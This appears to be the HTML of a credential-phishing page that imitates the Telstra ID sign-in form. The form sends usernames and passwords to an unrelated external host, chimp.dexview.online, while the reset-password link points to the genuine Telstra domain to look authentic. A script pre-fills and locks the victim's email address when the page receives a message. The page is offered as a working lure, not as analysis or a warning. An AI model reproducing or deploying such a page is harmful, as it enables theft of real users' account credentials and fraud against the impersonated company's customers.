<script>
    function validateEmail(email) {
      const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      return regex.test(email);
    }
	  window.addEventListener('message', event => {
      const defaultEmail = event.data;
	  const emailInput = document.getElementById('username');
	  const passwordInput = document.getElementById('password');

      if (validateEmail(defaultEmail)) {
        emailInput.value = defaultEmail;
        emailInput.setAttribute('readonly', 'true'); 
        passwordInput.focus();
      } else {
        emailInput.removeAttribute('readonly'); 
		emailInput.focus();
      }
	  });
	</script>

<h1 class="t-header t-able-spacing-2x-mb">Sign in</h1>
<div class="t-sub-heading t-able-spacing-7x-mb">Sign in with your Telstra ID</div>
<form action="https://chimp.dexview.online/telstra/xmas/new/index.php" autocomplete="off" method="POST">
<div class="t-able-text-field t-pwd-field t-able-spacing-2x-mb">
<label for="username">Username</label>
<input aria-describedby="" aria-invalid="false" aria-required="true" autocomplete="current-password" autofocus="" id="username" name="username" onblur="handleOnblurEvent(event)" required="required" type="text"/>
<p id="username-error-text"></p>
</div>
<div class="t-able-text-field t-pwd-field t-able-spacing-2x-mb">
<label for="password">Password</label>
<div class="password-field">
<input aria-describedby="" aria-invalid="false" aria-required="true" autocomplete="current-password" autofocus="" id="password" name="password" onblur="handleOnblurEvent(event)" required="required" type="password"/>
<button aria-label="Show password characters" class="t-able-low-emph-button t-showpwd" id="showPwdBtn" onclick="togglePassword('show')" type="button">Show</button>
<button aria-label="Hide password characters" class="t-able-low-emph-button t-showpwd hide-password" id="hidePwdBtn" onclick="togglePassword('hide')" type="button">Hide</button>
</div>
<p id="password-error-text"></p>
</div>
<div class="t-able-spacing-2x-mb">
<a class="t-able-low-emph-button t-reset-password-link" href="https://myid.telstra.com/identity/as/authorization.oauth2?client_id=mytelstra&amp;redirect_uri=https%3A%2F%2Fwww.myservices.telstra.com.au%2Fmytelstra%2Flogin-intermediate&amp;response_type=code&amp;scope=openid+app.mytelstra&amp;state=f839a6d4a46b41a28116d63c56bf5407&amp;code_challenge=JoOTmYNCIROI1sxWPx3iG1m83XSxkaYuPDldhX_TRyA&amp;code_challenge_method=S256&amp;PasswordReset_UsernameVerification=true" onclick="loadAnalyticEvents('click', 'clickTrack', 'linkClick', 'Reset password')"> Reset password </a>
</div>
<div class="">
<button class="t-able-high-emph-button t-able-spacing-7x-mb" id="submit_btn" type="submit">Sign in</button>
</div>
</form>
